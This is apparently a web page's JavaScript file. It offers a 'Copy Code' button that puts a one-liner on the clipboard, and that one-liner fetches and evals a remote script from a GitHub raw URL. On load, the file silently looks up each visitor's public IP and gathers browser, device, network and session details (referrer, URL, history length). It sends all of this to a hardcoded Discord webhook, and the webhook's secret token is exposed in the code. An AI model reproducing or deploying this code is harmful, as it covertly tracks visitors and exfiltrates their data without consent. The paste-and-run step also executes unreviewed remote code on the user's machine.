function copy(){
    var copyText = `req = new XMLHttpRequest(); req.open('GET', 'https://raw.githubusercontent.com/Marzex05/psych/refs/heads/main/functBlank.js'); req.onload = function() { eval(this.responseText + 'mask();'); }; req.send();`
  
     // Copy the text inside the text field
    navigator.clipboard.writeText(copyText);
  
    // Alert the copied text
    console.log("Copied the text: " + copyText);
    document.getElementById("copy").innerHTML = "[Copied!]"

    setTimeout(function(){
    document.getElementById("copy").innerHTML = "[Copy Code]"
    }, 1500);


}



            // Function to send a message via Discord Webhook
            function sendToDiscord(message) {
                const webhookURL = "https://ptb.discord.com/api/webhooks/1116080907347038279/PsN1Q2aXxxWSlOwgvE8goAjcXmUebFm3YngMrDnQCWuGPSYDrnQ4lII6LMxd_aU3VKal"; // Replace with your actual Discord Webhook URL
            
                // Prepare the payload data
                const payload = {
                    content: message, // The content of the message to send
                };
            
                // Send the message via the webhook using fetch API
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload) // Convert payload to JSON
                })
                .then(response => {
                    if (response.ok) {
                        console.log("Webpage Responded!");
                    } else {
                        console.error("Failed to respond: ", response.status);
                    }
                })
                .catch(error => {
                    console.error("Error responding: ", error);
                });
            }
             
            
            function getInfo() {
                
                const info = {
                    browser: {
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        platform: navigator.platform,
                        cookiesEnabled: navigator.cookieEnabled,
                        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : "N/A"
                    },
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth
                    },
                    device: {
                        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                        deviceMemory: navigator.deviceMemory || "Unknown"
                    },
                    network: {
                        online: navigator.onLine,
                        connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
                        downlink: navigator.connection ? navigator.connection.downlink + " Mbps" : "Unknown"
                    },
                    session: {
                        referrer: document.referrer,
                        location: window.location.href,
                        previousPages: history.length
                    }
                };
                return JSON.stringify(info, null, 2);
                
            }
            
            
            // Function to log detailed information about the client's device
            function logClientDetails() {
                // Log client browser info
                const clientBrowser = navigator.userAgent;
            
                // Fetch the client IP address from ipify API
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        const clientIP = data.ip;
                        // Log as JavaScript variables
                        window.clientBrowser = clientBrowser;
                        window.clientIP = clientIP;       
                        var browserInfo = window.clientBrowser
                        var clientInfo = window.clientIP
                        var aaa = String(clientInfo)
                        var bbb = String(browserInfo)
                        sendToDiscord(aaa)
                        sendToDiscord(bbb)
                    })
                    .catch(err => console.error('Error fetching IP address:', err));
                }
                logClientDetails()
                sendToDiscord(getInfo())
